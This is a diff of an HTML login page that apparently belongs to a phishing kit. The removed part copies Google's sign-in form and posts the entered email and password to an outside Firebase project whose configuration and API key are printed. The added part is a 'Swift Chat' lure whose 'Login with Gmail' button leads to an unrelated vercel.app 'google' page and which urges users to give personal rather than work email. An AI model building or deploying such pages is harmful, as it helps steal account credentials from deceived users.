@@ -147,98 +147,108 @@
 
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Login Page</title>
-    <link rel="stylesheet" href="style.css">
-  </head>
-  <body>
-    <div class="login-container">
-      <h1>Login</h1>
-      <form id="gaia_loginform">
-        <input name="GALX" type="hidden" value="VV3pYsdUZ38">
-        <input name="continue" type="hidden" value="https://accounts.google.com/ManageAccount">
-        <input name="followup" type="hidden" value="https://accounts.google.com/ManageAccount">
-        <input type="hidden" id="_utf8" name="_utf8" value="&#9731;"/>
-        <input type="hidden" name="bgresponse" id="bgresponse" value="js_disabled">
-        <input type="hidden" id="pstMsg" name="pstMsg" value="0">
-        <input type="hidden" id="dnConn" name="dnConn" value="">
-        <input type="hidden" id="checkConnection" name="checkConnection" value="">
-        <input type="hidden" id="checkedDomains" name="checkedDomains" value="youtube">
+<head>
+  <title>Login Page</title>
+  <style>
+    /* Body styles */
+    body {
+      font-family: 'Arial', sans-serif;
+      background-color: #000;
+      margin: 0;
+      padding: 0;
+      color: #fff;
+    }
 
-        <label class="hidden-label" for="Email">Email</label>
-        <input id="signup-email-input" name="Email" type="email" placeholder="Email" value="" spellcheck="false" class="">
+    /* Container styles */
+    .container {
+      max-width: 400px;
+      margin: 100px auto;
+      padding: 20px;
+      background-color: #111;
+      border: 1px solid #00ff77;
+      border-radius: 5px;
+      box-shadow: 0 0 20px #00ff77, 0 0 40px #00ff77, 0 0 60px #00ff77;
+    }
 
-        <label class="hidden-label" for="Passwd">Password</label>
-        <input id="signup-password-input" name="Passwd" type="password" placeholder="Password" class="">
+    /* Button styles */
+    .login-button {
+      display: block;
+      margin-bottom: 10px;
+      padding: 10px;
+      width: 100%;
+      font-size: 16px;
+      font-weight: bold;
+      text-align: center;
+      text-decoration: none;
+      color: #000;
+      background-color: #ff6a00;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      position: relative;
+      overflow: hidden;
+    }
 
-        <input id="signUp" name="signIn" class="rc-button rc-button-submit" type="submit" value="Sign Up">
-        <label class="remember">
-          <input id="PersistentCookie" name="PersistentCookie" type="checkbox" value="yes" checked="checked">
-          <span>
-            Stay signed in
-          </span>
-          <div class="bubble-wrap" role="tooltip">
-            <div class="bubble-pointer"></div>
-            <div class="bubble">
-              For your convenience, keep this checked. On shared devices, additional precautions are recommended.
-              <a href="https://support.google.com/accounts/?p=securesignin&hl=en" target="_blank">Learn more</a>
-            </div>
-          </div>
-        </label>
-        <input type="hidden" name="rmShown" value="1">
-        <a id="link-forgot-passwd" href="https://accounts.google.com/RecoverAccount?continue=https%3A%2F%2Faccounts.google.com%2FManageAccount" class="need-help-reverse">
-          Need help?
-        </a>
-      </form>
+    .login-button:before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle, rgba(255, 255, 255, 0.2) 0%, rgba(255, 255, 255, 0) 80%);
+      transform: translate(-30%, -30%) scale(1);
+      transition: transform 0.5s;
+    }
+
+    .login-button:hover:before {
+      transform: translate(-30%, -30%) scale(10);
+    }
+
+    /* Button-specific styles */
+    #pwc-login-button {
+      background-color: #ffaa00;
+    }
+
+    /* Button-specific styles */
+    #pwc-login-button:hover {
+      background-color: #ff9900;
+    }
+
+    /* Button container styles */
+    .button-container {
+      text-align: center;
+    }
+
+    /* Warning text styles */
+    .warning-text {
+      color: #ff4444;
+      font-size: 12px;
+      text-align: center;
+    }
+
+    /* Title styles */
+    .title {
+      text-align: center;
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
+  </style>
+  <script>
+    function pwcLoginClicked() {
+      alert("Not available yet");
+    }
+  </script>
+</head>
+<body>
+  <div class="container">
+    <h1 class="title">Welcome to Swift Chat</h1>
+    <div class="button-container">
+      <a href="#" class="login-button" id="pwc-login-button" onclick="pwcLoginClicked()">Login with PWC Pass</a>
+      <a href="https://www.unitedstates.vercel.app/auth/google.html" class="login-button">Login with Gmail</a>
     </div>
-
-    <script type="module">
-      // Import Firebase modules
-      import { initializeApp } from "https://www.gstatic.com/firebasejs/9.21.0/firebase-app.js";
-      import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.21.0/firebase-analytics.js";
-      import { getAuth, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/9.21.0/firebase-auth.js";
-
-  const firebaseConfig = {
-    apiKey: "AIzaSyBM_SzQJhx2P5hx2qxkoFz3M08qbTgzLiI",
-    authDomain: "keysystem-75569.firebaseapp.com",
-    projectId: "keysystem-75569",
-    storageBucket: "keysystem-75569.appspot.com",
-    messagingSenderId: "969885406952",
-    appId: "1:969885406952:web:2426c76817e6a52cef5b5d",
-    measurementId: "G-SD5K4YJEF6"
-  };
-
-      // Initialize Firebase
-      const app = initializeApp(firebaseConfig);
-      const analytics = getAnalytics(app);
-
-      // Get a reference to the Firebase authentication instance
-      const auth = getAuth();
-
-      // Get the signup form elements
-      const signupForm = document.querySelector("#gaia_loginform");
-      const signupEmailInput = document.querySelector("#signup-email-input");
-      const signupPasswordInput = document.querySelector("#signup-password-input");
-
-      // Add an event listener to the signup form
-      signupForm.addEventListener("submit", (event) => {
-        event.preventDefault(); // Prevent the form from submitting
-
-        const email = signupEmailInput.value;
-        const password = signupPasswordInput.value;
-
-        // Call the Firebase createUserWithEmailAndPassword method to create a new user
-        createUserWithEmailAndPassword(auth, email, password)
-          .then(() => {
-            // The user is now signed up
-            console.log("User signed up successfully");
-            window.location.replace("https://ifcodebank.vercel.app/index.html");
-          })
-          .catch((error) => {
-            // Handle errors that occurred during sign up
-            console.error(error);
-          });
-      });
-    </script>
-  </body>
+    <p class="warning-text">Please use your personal email instead of your organization email.</p>
+  </div>
+</body>
 </html>
